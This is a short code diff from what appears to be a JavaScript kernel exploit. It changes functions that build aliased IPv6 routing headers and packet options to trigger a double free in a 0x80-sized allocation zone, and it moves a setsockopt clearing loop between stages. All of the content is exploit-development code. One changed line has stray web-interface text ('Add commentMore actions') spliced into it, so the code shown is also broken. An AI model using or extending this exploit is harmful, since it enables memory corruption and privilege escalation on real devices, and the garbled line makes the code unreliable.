@@ -454,7 +454,6 @@ function spawn_thread(thread) {
 // EXPLOIT STAGES IMPLEMENTATION
 
 // FUNCTIONS FOR STAGE: 0x80 MALLOC ZONE DOUBLE FREE
-
 function make_aliased_rthdrs(sds) {
     const marker_offset = 4;
     const size = 0x80;
@@ -462,6 +461,10 @@ function make_aliased_rthdrs(sds) {
     const rsize = build_rthdr(buf, size);
 
     for (let loop = 0; loop < num_alias; loop++) {
+        for (let i = 0; i < num_sds; i++) {
+            setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);Add commentMore actions
+        }
+
         for (let i = 0; i < num_sds; i++) {
             buf.write32(marker_offset, i);
             set_rthdr(sds[i], buf, rsize);
@@ -982,10 +985,6 @@ function make_aliased_pktopts(sds) {
 
                 return pair;
             }
-        }
-
-        for (let i = 0; i < num_sds; i++) {
-            setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
         }
     }
     die('failed to make aliased pktopts');
